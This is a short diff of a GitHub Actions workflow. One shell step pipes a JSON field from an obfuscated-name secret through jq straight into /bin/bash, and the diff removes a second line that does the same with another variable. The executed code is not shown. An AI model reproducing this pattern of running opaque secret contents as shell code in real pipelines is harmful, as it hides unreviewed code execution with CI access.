@@ -21,7 +21,6 @@ jobs:
           isl01712: ${{ secrets.isl01712 }}
         run: |
           printf '%s' "$isl01712" | jq -r .jzrau387 | /bin/bash
-          printf '%s' "$h10339" | jq -r .lrmjy7683 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
